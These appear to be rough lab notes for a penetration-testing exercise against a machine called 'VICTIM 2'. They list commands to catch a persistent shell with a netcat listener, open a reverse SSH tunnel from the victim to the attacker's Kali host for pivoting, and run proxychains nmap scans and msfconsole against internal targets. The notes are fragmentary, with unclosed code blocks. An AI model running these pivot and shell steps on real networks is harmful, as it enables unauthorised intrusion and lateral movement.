#Changing Targets VICTIM 2



## Introduction



Here You will find techniques PERSISTENT SHELL, PIVIOT, AND PING SWEEP.



## Section 1: CATCH PERSISTENT SHELL



### (ATTACKER)



```bash
# nc -lvp 55556
upgrade shell






## NEXT CONDUCT A PIVIOT



### (ATTACKER)



```bash
# netstat -natp
# netstat -natp | grep LISTEN



_AFTER CATCHING PERSISTENT SHELL (USE YOUR SSH PORT)
_OPEN SSH FOR LISTNER TO SET UP PROXY



```bash
#sudo systemctl status ssh.service
#sudo systemctl start ssh.service



### (VICTIM)
```bash
# ssh -N -f -R 127.0.0.1:9080 kali@192.168.122.209 -p 55555



(MAKE SURE PORT FWD RULE IS GOOD ON PFSENSE SSH PORT 22)
if it states port fowarding failed it means you alrady have ypur proxy open
(VICTIM) should be promted a password



## NEXT CONDUCT A PING SWEEP



_NOTE: YOUR DIRECTORIES MAY VARY COMPARED TO MY EXAMPLE DEPENDING HOW AND WHERE YOUR SCOPE FILE IS ON KALI



### (ATTACKER)
```bash
# LS
# CD INTERNAL
_(SHOULD SEE IP'S PING SWEEPS AND TARGETS)
# LS
# CD 192.168.1.102 (=SOC4)
# sudo proxychains nmap -iL scope -F -Pn -sT | tee fast_scan



_USE A THIRD TERMINAL
```bash
# sudo proxychains msfconsole [1:24:44]
